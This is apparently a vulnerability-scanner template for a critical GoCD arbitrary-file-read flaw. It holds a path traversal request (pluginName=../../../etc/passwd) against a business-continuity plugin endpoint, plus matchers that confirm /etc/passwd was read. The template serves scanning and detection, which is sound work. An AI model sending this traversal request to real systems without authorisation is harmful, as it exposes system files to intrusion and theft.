id: go-cd-arbitrary-file

info:
  name: GoCD Arbitrary File
  author: dhiyaneshDk
  severity: critical
  reference: https://twitter.com/wvuuuuuuuuuuuuu/status/1456316586831323140
  tags: go,rce,intrusive,lfi

requests:
  - method: GET
    path:
      - "{{BaseURL}}/go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../etc/passwd"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "root:.*:0:0:"
